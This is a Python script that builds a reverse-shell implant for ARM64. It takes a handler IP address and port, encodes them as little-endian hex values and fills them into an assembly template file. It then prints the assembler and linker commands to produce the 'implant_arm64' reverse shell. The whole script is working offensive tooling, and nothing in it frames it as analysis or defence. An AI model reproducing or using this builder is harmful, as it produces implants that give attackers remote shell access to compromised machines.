import sys
import struct

# Checks for correct number of arguments and prints usage when '-h' or '--help' is passed as an argument
if (len(sys.argv) != 3 or sys.argv[1] == '-h' or sys.argv[1] == '--help'):
    print("Usage: " + sys.argv[0] + " <HANDLER-ADDR> <HANDLER-PORT>")
    exit()

ip_addr = sys.argv[1]
port = int(sys.argv[2])

## Formatting Port
port_hexformat = hex(port).split('x')[-1]

# Rounding Port Hex Value To 4 Characters
# E.g., Port 80 -> (To Hex) -> 50 -> (Round To 4 Characters) -> 0050

if (len(port_hexformat) < 4):
    appended_zeros = 4 - len(port_hexformat)
    port_hexformat = '0' * appended_zeros + port_hexformat

# Dividing the Port Hex Value in Two parts And Storing It In Array
# E.g., Port 4444 -> (To Hex) -> 115C -> (Divide In 2 Parts) -> [11, 5C]

port_hexformat_array = []

for x in range(0, len(port_hexformat), 2):
    port_hexformat_array.append(port_hexformat[x] + port_hexformat[x+1])
    
# Reversing Array Containing The Port Hex Value In Two Parts And Combining It To Make It Little Endian
# E.g., Port 4444 -> (To Hex) -> 115C -> (Divide In 2 Parts) -> [11, 5C] -> (Reverse And Combine It) -> 0x5C11

port_hexformat_le = '0x'

for x in port_hexformat_array[::-1]:
    port_hexformat_le = port_hexformat_le + x

## Formatting IP Address

# Splitting IP Address Into Octets
# E.g., '127.0.0.1' -> ['127', '0', '0', '1']
ip_addr_octets = ip_addr.split(".")

# Initializing A Blank Array For Later
ip_addr_octets_hexformat_array = []

for x in ip_addr_octets:
    # Rounding IP Address Octet Hex Value To 2 Characters
    if (len(hex(int(x)).split('x')[-1]) < 2):
        appended_zeros = 2 - len(hex(int(x)).split('x')[-1])
        # Storing It In Array 
        # E.g., '127.0.0.1' -> ['127', '0', '0', '1'] -> ['7F', '00', '00', '01']
        ip_addr_octets_hexformat_array.append('0' * appended_zeros + hex(int(x)).split('x')[-1])
    else:
        ip_addr_octets_hexformat_array.append(hex(int(x)).split('x')[-1])

# Dividing IP Address Hex Value In Two Parts And Storing It In Little Endian Formatting
# E.g., '127.0.0.1' -> ['7F', '00', '00', '01']
# First Part: 0x7F00 -> (Convert To Little Endian) -> 0x007F
# Second Part: 0x0001 -> (Convert To Little Endian) -> 0x0100

ip_addr_octet_le_part1 = '0x' + ip_addr_octets_hexformat_array[1] + ip_addr_octets_hexformat_array[0]
ip_addr_octet_le_part2 = '0x' + ip_addr_octets_hexformat_array[3] + ip_addr_octets_hexformat_array[2]

## Filling the assembly code template

# Reads From Template Assembly Code
# Finds The Line With Placeholder For IP Address & Port, Replaces Them With Computed Values - port_hexformat_le, ip_addr_octet_le_part1 & ip_addr_octet_le_part2
# Writes Them To New File, Ready To Compile

try:
    file_r = open("implant_arm64-template.s", "r")
except FileNotFoundError:
    print("Template File Not Found! Exiting...")
    exit()

file_w = open("implant_arm64.s", "w")

file_lines = []
for line in file_r:
    if "<PORT>" in line:
        line = line.replace("<PORT>", port_hexformat_le)
        file_w.write(line)
    elif "<IPV4-PART1>" in line:
        line = line.replace("<IPV4-PART1>", ip_addr_octet_le_part1)
        file_w.write(line)
    elif "<IPV4-PART2>" in line:
        line = line.replace("<IPV4-PART2>", ip_addr_octet_le_part2)
        file_w.write(line)
    else:
        file_w.write(line)

print("Embedded IPv4 Address and Port of Handler in Assembly Code (implant_arm64.s)")
print("Generate The Reverse Shell - ")
print("\nCommand: as -o implant_arm64.o implant_arm64.s")
print("Command: ld -o implant_arm64 implant_arm64.o")